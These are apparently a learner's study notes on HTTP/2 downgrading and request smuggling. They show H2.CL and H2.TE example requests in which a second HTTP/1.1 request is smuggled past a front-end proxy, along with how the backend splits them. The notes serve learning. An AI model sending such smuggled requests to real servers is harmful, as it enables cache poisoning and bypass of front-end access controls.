# HTTP/2 
Request / Response use binary protocol.

- Required headers use `:`
- Lowercase for other headers
- Precise boundaries (not \r\n)

## HTTP 1.1
```sh
POST / HTTP1.1\r\n
User-Agent: Mozilla Firefox\r\n
Content-Length: 4\r\n
Host: 10.10.10.10:80\r\n
\r\n
q=test
```

## HTTP 2
```sh
:method POST
:path /
:scheme https
:authority: 10.10.10.10:80
user-agent Mozilla Firefox
content-length 4
q=test
```

## Downgrading
When a reverse proxy serves content to the end user with http2 but request from the back-end using HTTP1.1.

`Client <- HTTP/2 -> Front-end <- HTTP 1.1 -> Back-end`

### How it works
The `content-length` header has no meaning in HTTP2, but nothing stops us from adding so it will be accepted by the backend.
```
:method POST
:path /
:scheme https
:authority example.com
user-agent: Mozilla/5.0
content-length 0
HELLO
```

#### Request 1 (translated)
With a content length of 0 the backend will think this is a POST request with no body. Whatever comes after the headers will be interpreted as the start of a new request. 
```
POST / HTTP1.1\r\n
Host: example.com\r\n
User-Agent: Mozilla/5.0\r\n
Content-Length: 0\r\n
\r\n
```

#### Request 2 (smuggled)
The word HELLO is not a complete http1.1 request, therefore the backend server will wait until more data arrives to complete it.
```
HELLO
```

## H2.TE
We can also add the `Transfer-Encoding: chunked` header to the front-end HTTP/2 request in hopes that it will be passed to the HTTP1.1 connection.

Original Request
```
:method POST
:path /
:scheme https
:authority example.com
user-agent Mozilla/5.0
transfer-encoding chunked
0\r\n
\r\n
GET /other HTTP/1.1\r\n
Bad: data
```

Request 1 (Translated)
```
POST / HTTP/1.1\r\n
Host: example.com\r\n
User-Agent: Mozilla/5.0\r\n
Transfer-Encoding: chunked\r\n
\r\n
0\r\n
\r\n
```

Request 2 (Smuggled)
```
GET /other HTTP/1.1\r\n
Bad: data
```
